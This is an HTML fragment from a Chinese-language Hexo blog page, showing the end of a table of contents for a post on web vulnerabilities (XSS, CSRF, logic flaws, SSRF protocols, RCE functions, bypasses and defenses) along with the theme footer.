href="#XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">XSS跨站脚本漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B7%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%BD%93%E7%BD%91%E7%AB%99%E5%90%8C%E6%97%B6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%E5%92%8CCSRF%E6%BC%8F%E6%B4%9E%E6%97%B6%EF%BC%8Ctoken%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E5%B0%86%E4%BC%9A%E5%A4%B1%E6%95%88%EF%BC%81"><span class="toc-number">5.0.0.1.</span> <span class="toc-text">请注意：当网站同时存在XSS漏洞和CSRF漏洞时，token验证机制将会失效！</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">逻辑错误漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞挖掘</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">7.1.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="toc-number">7.2.</span> <span class="toc-text">协议利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dict%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.2.1.</span> <span class="toc-text">Dict协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.2.2.</span> <span class="toc-text">Gopher协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.2.3.</span> <span class="toc-text">File协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.</span> <span class="toc-text">RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.</span> <span class="toc-text">常见危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.1.</span> <span class="toc-text">系统命令执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.2.</span> <span class="toc-text">代码执行函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE%E7%BB%95%E8%BF%87"><span class="toc-number">8.2.</span> <span class="toc-text">RCE绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">8.3.</span> <span class="toc-text">RCE命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">8.4.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5-1"><span class="toc-number">8.5.</span> <span class="toc-text">防护策略</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">&lt;- To be continued  (:3 ∠)_</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
